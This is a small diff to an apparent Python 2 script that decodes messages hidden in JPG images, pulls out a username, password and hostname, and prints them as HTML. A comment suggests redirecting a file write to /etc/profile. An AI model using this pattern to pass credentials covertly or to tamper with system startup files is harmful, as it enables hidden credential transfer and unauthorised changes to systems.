@@ -36,9 +36,8 @@ decode_dir = path.expanduser("images/")
 for infile in glob.glob(decode_dir+"*.jpg"):
 	msg = decode(infile)
 	if isvalidformat(msg):
-		print "\n-->DECODE RUN :", infile
 		login = getdetails(msg)
-		print "Username :", login[1], "\nPassword :", login[0], "\nHostname:",login[2]
+		print "<b>Username</b> :", login[1], "<br/><b>Password</b> :", login[0], "<br/><b>Hostname:</b>",login[2],"<br/><br/>"
 
 f = open('updated.txt','w+')			# Change file to /etc/profile
 f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
